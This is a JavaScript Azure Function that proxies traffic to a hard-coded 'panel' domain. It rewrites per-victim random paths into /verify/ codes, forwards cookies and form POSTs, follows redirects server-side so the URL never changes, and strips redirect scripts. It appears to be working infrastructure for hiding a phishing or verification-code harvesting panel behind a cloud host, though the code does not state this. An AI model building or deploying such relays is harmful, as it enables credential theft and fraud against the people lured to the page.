const crypto = require('crypto');

const PANEL = 'tute.ink';

module.exports = async function (context, req) {
    let path = req.headers['x-ms-original-url'] || req.url || '/';
    try { if (path.startsWith('http')) { const u = new URL(path); path = u.pathname + u.search; } } catch(e){}
    
    // 1. Remove the proxy prefix if it exists
    path = path.replace(/^\/api\/proxy/, '');
    if (!path.startsWith('/')) path = '/' + path;

    // 2. Add query strings
    if (req.query && Object.keys(req.query).length > 0) {
        const qs = new URLSearchParams(req.query).toString();
        if (!path.includes('?')) path += '?' + qs;
    }

    // Ignore Cloudflare internal paths
    if (path.startsWith('/cdn-cgi/')) {
        context.res = { status: 404, body: '' };
        return;
    }

    // 3. SMART ROUTING (Extract the code and the random string)
    const parts = path.split('/').filter(Boolean);
    let originalRandomString = '';
    
    if (parts.length === 2 && parts[0] !== 'api' && parts[1].length > 4) {
        originalRandomString = parts[0]; // e.g., "bc29429fe8ed"
        path = `/verify/${parts[1]}`;    // e.g., "M7OCTS"
    } else if (parts.length === 1 && parts[0].length > 4) {
        path = `/verify/${parts[0]}`;
    }

    context.log(`Forwarding ${req.method} to: ${path}`);

    const forwardHeaders = {
        'Host': PANEL,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': req.headers['accept'] || '*/*',
        'X-Ablegod-Worker': '1'
    };
    if (req.headers['cookie'])       forwardHeaders['Cookie']       = req.headers['cookie'];
    if (req.headers['content-type']) forwardHeaders['Content-Type'] = req.headers['content-type'];

    let body;
    if (!['GET','HEAD'].includes(req.method) && req.body) {
        body = typeof req.body === 'string' ? req.body : JSON.stringify(req.body);
        if (!forwardHeaders['Content-Type']) forwardHeaders['Content-Type'] = 'application/json';
    }

    try {
        let currentUrl = `https://${PANEL}${path}`;
        let r;

        // 4. FOLLOW HTTP REDIRECTS SERVER-SIDE (Stops the URL from changing)
        for (let hop = 0; hop < 5; hop++) {
            r = await fetch(currentUrl, {
                method: req.method,
                headers: forwardHeaders,
                body: body,
                redirect: 'manual'
            });

            const loc = r.headers.get('location');
            if (r.status >= 300 && r.status < 400 && loc) {
                let finalUrl = new URL(loc, currentUrl).toString();
                finalUrl = finalUrl.replace(/^https:\/\/(www\.)?tute\.ink/, `https://${PANEL}`);
                context.log(`HTTP Redirect hop ${hop} → ${finalUrl}`);
                currentUrl = finalUrl;
                continue;
            }
            break;
        }

        let responseBody = await r.text();
        const contentType  = r.headers.get('content-type') || 'text/html';

        // 5. STRIP JS REDIRECTS AND FIX FORM ACTION
        if (contentType.includes('text/html')) {
            // Delete scripts that force a window.location change
            responseBody = responseBody.replace(/<script\b[^>]*>([\s\S]*?)<\/script>/gi, function(match, scriptContent) {
                if (scriptContent.includes('window.location') || scriptContent.includes('location.href')) {
                    return ''; 
                }
                return match;
            });
            responseBody = responseBody.replace(/window\.location(\.[a-zA-Z]+)?\s*=\s*['"][^'"]+['"];?/gi, '');
            responseBody = responseBody.replace(/window\.location\.(replace|assign)\(['"][^'"]+['"]\);?/gi, '');
            responseBody = responseBody.replace(/<meta[^>]*http-equiv=["']?refresh["']?[^>]*>/gi, '');

            // Rewrite the form action so POSTs go to the API proxy instead of directly to /verify/
            // This forces Azure to accept the POST request
            responseBody = responseBody.replace(/action=["']\/verify\/([^"']+)["']/gi, `action="/api/proxy/${originalRandomString}/$1"`);
            responseBody = responseBody.replace(/<form method="POST" id="verifyForm"/gi, `<form action="/api/proxy/${originalRandomString}/x" method="POST" id="verifyForm"`);
        }

        const respHeaders = {
            'Content-Type': contentType,
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
            'Access-Control-Allow-Headers': 'Content-Type, Authorization',
            'Cache-Control': 'no-store, no-cache, must-revalidate'
        };
        
        const setCookie = r.headers.get('set-cookie');
        if (setCookie) respHeaders['Set-Cookie'] = setCookie;

        // Always return 200 to the browser so it doesn't try to redirect
        context.res = { status: 200, headers: respHeaders, body: responseBody };
    } catch (e) {
        context.log('Error:', e.message);
        context.res = { status: 500, body: 'Proxy Error: ' + e.message };
    }
};
